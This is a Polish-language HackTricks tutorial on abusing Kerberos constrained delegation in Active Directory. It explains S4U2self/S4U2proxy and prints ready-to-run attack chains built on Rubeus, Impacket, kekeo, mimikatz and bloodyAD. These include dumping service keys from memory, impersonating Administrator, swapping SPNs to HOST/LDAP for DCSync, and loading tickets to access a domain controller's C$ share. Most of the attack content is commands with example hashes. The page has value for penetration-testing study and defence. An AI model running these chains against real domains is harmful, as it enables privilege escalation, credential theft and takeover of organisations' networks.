# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Korzystając z tego, Domain admin może **zezwolić** komputerowi na **podszywanie się pod użytkownika lub komputer** względem dowolnej **usługi** komputera.

- **Service for User to self (_S4U2self_):** Dowolne **konto usługowe posiadające SPN** może zwykle uzyskać TGS do samego siebie w imieniu dowolnego użytkownika. Jeśli konto ma również [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) w _userAccountControl_, ten TGS jest **forwardable**, co sprawia, że protocol transition jest bezpośrednio użyteczny w przypadku **classic constrained delegation**.
- **Service for User to Proxy(_S4U2proxy_):** **Konto usługowe** może uzyskać TGS w imieniu użytkownika dla SPN-ów wymienionych w **msDS-AllowedToDelegateTo**. Bilet dowodowy używany przez S4U2Proxy musi być biletem **forwardable** do usługi delegującej: albo prawdziwym biletem klient-usługa przechwyconym od ofiary, albo biletem wygenerowanym za pomocą **S4U2Self + T2A4D**.

**Uwaga**: Jeśli użytkownik jest oznaczony w AD jako „_Account is sensitive and cannot be delegated_” lub jest członkiem **Protected Users**, zwykle **nie będzie można podszyć się pod niego** za pomocą constrained delegation. W nowoczesnych domenach podczas atakowania kont z włączoną delegacją preferuj materiał **AES** zamiast założeń dotyczących wyłącznie RC4.

Oznacza to, że jeśli **przejmiesz hash konta usługowego**, możesz **podszywać się pod użytkowników** i uzyskać **dostęp** w ich imieniu do dowolnej **usługi** na wskazanych komputerach (możliwy **privesc**).

Co więcej, **uzyskasz dostęp nie tylko do usługi, pod którą użytkownik może się podszyć, ale także do dowolnej usługi**, ponieważ SPN (nazwa żądanej usługi) nie jest sprawdzany (w bilecie ta część nie jest szyfrowana ani podpisana). Dlatego jeśli masz dostęp do **usługi CIFS**, możesz również uzyskać dostęp do **usługi HOST**, używając na przykład flagi `/altservice` w Rubeus. Ta sama słabość związana z zamianą SPN jest wykorzystywana przez **Impacket getST -altservice** i inne narzędzia.

Ponadto **dostęp do usługi LDAP na DC** jest wymagany do wykorzystania **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**Uwaga operatora:** nie ufaj wyłącznie **zrzutom ekranu ADUC** ani BloodHound podczas przeglądu **gMSA/sMSA**. Te konta często nie pokazują standardowej karty Delegation, dlatego wyliczaj bezpośrednio surowe atrybuty **`userAccountControl`** i **`msDS-AllowedToDelegateTo`**.
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Protocol-transition vs Kerberos-only constrained delegation

Jeśli zaatakowane konto ma **T2A4D**, zwykle można wykonać pełny łańcuch **`S4U2Self -> S4U2Proxy`**, korzystając wyłącznie z klucza usługi/TGT.<sup>[[2]](#references)</sup>

Jeśli ma ono tylko **`msDS-AllowedToDelegateTo`** (klasyczny tryb **"Use Kerberos only"**), delegation nadal może być wykorzystane, ale bilet dowodowy dla S4U2Proxy musi być **prawdziwym forwardable biletem user-to-service** dla usługi delegującej. W praktyce oznacza to kradzież lub przechwycenie TGS ofiary z **LSASS/ccache** i przekazanie go do drugiego etapu (`/tgs:` w Rubeus). **Non-forwardable** bilet S4U2Self nie wystarcza w przypadku classic constrained delegation; jeśli jest to jedyny dostępny bilet dowodowy, sprawdź [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).<sup>[[2]](#references)</sup>

### Uwagi dotyczące cross-domain constrained delegation (2025+)

Od **Windows Server 2012/2012 R2** KDC obsługuje **constrained delegation między domenami/forestami** za pośrednictwem rozszerzeń S4U2Proxy. Nowoczesne buildy (Windows Server 2016–2025) zachowują to działanie i dodają dwa PAC SIDs sygnalizujące protocol transition:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) gdy użytkownik uwierzytelnił się normalnie.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) gdy usługa potwierdziła tożsamość za pośrednictwem protocol transition.

Gdy protocol transition jest używany między domenami, oczekuj `SERVICE_ASSERTED_IDENTITY` wewnątrz PAC, co potwierdza pomyślne wykonanie kroku S4U2Proxy.<sup>[[1]](#references)</sup>

### Narzędzia Impacket / Linux (altservice & full S4U)

Najnowszy Impacket (0.11.x+) udostępnia ten sam łańcuch S4U oraz zamianę SPN co Rubeus:<sup>[[2]](#references)</sup>
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
Jeśli wolisz najpierw sfałszować user ST (np. mając tylko hash offline), połącz **ticketer.py** z **getST.py** na potrzeby S4U2Proxy. **tgssub.py** jest również przydatne, gdy masz już działający ccache i musisz jedynie zamienić service class dla tego samego hosta. Zobacz otwarte zgłoszenie Impacket #1713, aby poznać aktualne problemy (KRB_AP_ERR_MODIFIED, gdy sfałszowany ST nie pasuje do klucza SPN).<sup>[[2]](#references)</sup>

### Automatyzacja konfiguracji delegacji z użyciem poświadczeń o niskich uprawnieniach

Jeśli masz już **GenericAll/WriteDACL** dla konta komputera lub service account, możesz zdalnie ustawić wymagane atrybuty bez RSAT, używając **bloodyAD** (2024+):
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
To pozwala zbudować ścieżkę constrained delegation do privesc bez uprawnień DA, gdy tylko możesz zapisywać te atrybuty.

- Step 1: **Get TGT of the allowed service**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Istnieją **inne sposoby uzyskania biletu TGT** lub **RC4** albo **AES256** bez bycia SYSTEM w komputerze, takie jak Printer Bug i unconstrained delegation, NTLM relaying oraz Active Directory Certificate Service abuse
>
> **Mając tylko ten bilet TGT (lub jego hash), możesz przeprowadzić ten atak bez przejmowania całego komputera.**

- Krok 2: **Uzyskaj TGS dla usługi, podszywając się pod użytkownika**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Więcej informacji na stronie ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) oraz [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Przegląd Kerberos Constrained Delegation (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Abusing Delegation with Impacket (część 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity zabiła domenę: ofensywny przegląd Kerberos (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
{{#include ../../banners/hacktricks-training.md}}
